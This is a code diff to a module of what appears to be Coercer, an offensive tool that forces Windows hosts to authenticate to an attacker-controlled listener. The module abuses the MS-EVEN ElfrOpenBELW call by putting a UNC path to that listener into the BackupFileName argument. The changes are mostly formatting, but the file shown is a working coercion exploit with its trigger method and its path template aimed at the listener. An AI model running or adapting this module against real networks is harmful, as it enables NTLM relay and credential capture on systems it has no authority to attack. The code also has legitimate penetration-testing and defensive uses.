@@ -6,10 +6,11 @@
 
 
 import random
-from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
-from coercer.network.DCERPCSessionError import DCERPCSessionError
+
 from impacket.dcerpc.v5 import even
 from impacket.dcerpc.v5.dtypes import NULL
+
+from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
 
 
 class ElfrOpenBELW(MSPROTOCOLRPCCALL):
@@ -21,7 +22,7 @@ class ElfrOpenBELW(MSPROTOCOLRPCCALL):
     """
 
     exploit_paths = [
-        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa')
+        ("smb", "\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa")
     ]
 
     access = {
@@ -29,37 +30,34 @@ class ElfrOpenBELW(MSPROTOCOLRPCCALL):
             {
                 "namedpipe": r"\PIPE\eventlog",
                 "uuid": "82273fdc-e32a-18c3-3f78-827929dc23ea",
-                "version": "0.0"
+                "version": "0.0",
             }
         ],
         "ncacn_ip_tcp": [
-            {
-                "uuid": "82273fdc-e32a-18c3-3f78-827929dc23ea",
-                "version": "0.0"
-            }
-        ]
+            {"uuid": "82273fdc-e32a-18c3-3f78-827929dc23ea", "version": "0.0"}
+        ],
     }
 
     protocol = {
         "longname": "[MS-EVEN]: EventLog Remoting Protocol",
-        "shortname": "MS-EVEN"
+        "shortname": "MS-EVEN",
     }
 
     function = {
         "name": "ElfrOpenBELW",
         "opnum": 9,
-        "vulnerable_arguments": ["BackupFileName"]
+        "vulnerable_arguments": ["BackupFileName"],
     }
 
     def trigger(self, dcerpc_session, target):
         if dcerpc_session is not None:
             try:
-                self.path = self.path.rstrip('\x00')
+                self.path = self.path.rstrip("\x00")
                 request = even.ElfrOpenBELW()
-                request['UNCServerName'] = NULL
-                request['BackupFileName'] = self.path
-                request['MajorVersion'] = random.randint(0,100)
-                request['MinorVersion'] = random.randint(0,100)
+                request["UNCServerName"] = NULL
+                request["BackupFileName"] = self.path
+                request["MajorVersion"] = random.randint(0, 100)
+                request["MinorVersion"] = random.randint(0, 100)
                 resp = dcerpc_session.request(request)
                 resp.dump()
                 return ""
@@ -67,5 +65,6 @@ class ElfrOpenBELW(MSPROTOCOLRPCCALL):
                 return err
         else:
             from coercer.core.Reporter import reporter
+
             reporter.print_error("Error: dce is None, you must call connect() first.")
             return None
